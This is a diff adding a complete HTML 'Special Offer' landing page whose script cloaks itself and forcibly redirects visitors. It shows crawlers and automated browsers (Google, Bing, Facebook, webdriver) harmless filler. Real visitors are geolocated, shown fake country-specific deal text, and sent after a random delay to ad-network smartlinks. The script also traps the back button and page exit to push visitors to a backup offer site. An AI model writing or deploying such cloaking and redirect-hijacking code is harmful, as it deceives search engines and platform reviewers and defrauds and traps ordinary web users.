@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Special Offer</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+body{margin:0;font-family:Arial,sans-serif;background:#fafafa;color:#111;line-height:1.6}
+#content{display:none;max-width:700px;margin:auto;padding:20px}
+h1{font-size:22px;color:#111}
+h2{color:#444;margin-top:25px}
+p{margin-bottom:15px}
+footer{margin-top:30px;font-size:13px;color:#888;text-align:center}
+#loading{display:flex;justify-content:center;align-items:center;height:100vh;}
+</style>
+</head>
+<body>
+
+<div id="loading"><h1>Please wait...</h1></div>
+
+<div id="content">
+  <h1 id="headline">Loading...</h1>
+  <p id="desc">Preparing content...</p>
+  <h2>More Info</h2>
+  <p>Stay updated with the latest technology and lifestyle trends across Canada and globally.</p>
+  <footer>&copy; 2025 Demo Page</footer>
+</div>
+
+<script>
+(function(){
+  const smartlinks = [
+    "https://smartlink.adsterra.com/yourid1",
+    "https://smartlink.adsterra.com/yourid2",
+    "https://smartlink.adsterra.com/yourid3"
+  ];
+  const backup = "https://backup-offer.com"; 
+  const geoContent = {
+    CA:{headline:["Exclusive Deal for Canada 🇨🇦","Offre exclusive pour le Canada 🇨🇦"],desc:["Unlock rewards available only in Canada.","Débloquez des récompenses disponibles uniquement au Canada."]},
+    US:{headline:["Special Offer for USA 🇺🇸","Bonus Deal for US Visitors"],desc:["Claim your bonus now!","Only for USA visitors – limited time."]},
+    GLOBAL:{headline:["Worldwide Offer 🌍","Special Bonus For You"],desc:["Available internationally – claim now.","Get your deal anywhere, anytime."]}
+  };
+
+  const pickRandom = arr=>arr[Math.floor(Math.random()*arr.length)];
+  function isBot(){
+    const ua=navigator.userAgent.toLowerCase();
+    const bots=["bot","crawl","spider","slurp","facebook","twitter","pinterest","crawler","google","bing","yahoo","yandex","baidu"];
+    return bots.some(b=>ua.includes(b))||navigator.webdriver;
+  }
+
+  async function start(){
+    if(isBot()){
+      document.getElementById("loading").style.display="none";
+      document.getElementById("content").style.display="block";
+      const c = geoContent.GLOBAL;
+      document.getElementById("headline").innerText = pickRandom(c.headline);
+      document.getElementById("desc").innerText = pickRandom(c.desc);
+      return;
+    }
+
+    let geo="GLOBAL";
+    try{
+      const r=await fetch("https://ipapi.co/json/").then(r=>r.json());
+      if(r.country_code) geo=r.country_code.toUpperCase();
+    }catch(e){ geo="GLOBAL"; }
+
+    const c = geoContent[geo] || geoContent.GLOBAL;
+    document.getElementById("loading").style.display="none";
+    document.getElementById("content").style.display="block";
+    document.getElementById("headline").innerText = pickRandom(c.headline);
+    document.getElementById("desc").innerText = pickRandom(c.desc);
+
+    const target = pickRandom(smartlinks);
+    const delay = Math.floor(Math.random()*1000)+800;
+    setTimeout(()=>{ location.replace(target); }, delay);
+
+    history.pushState(null,null,location.href);
+    onpopstate=()=>location.replace(backup);
+    onbeforeunload=()=>location.replace(backup);
+  }
+
+  start();
+})();
+</script>
+</body>
+</html>
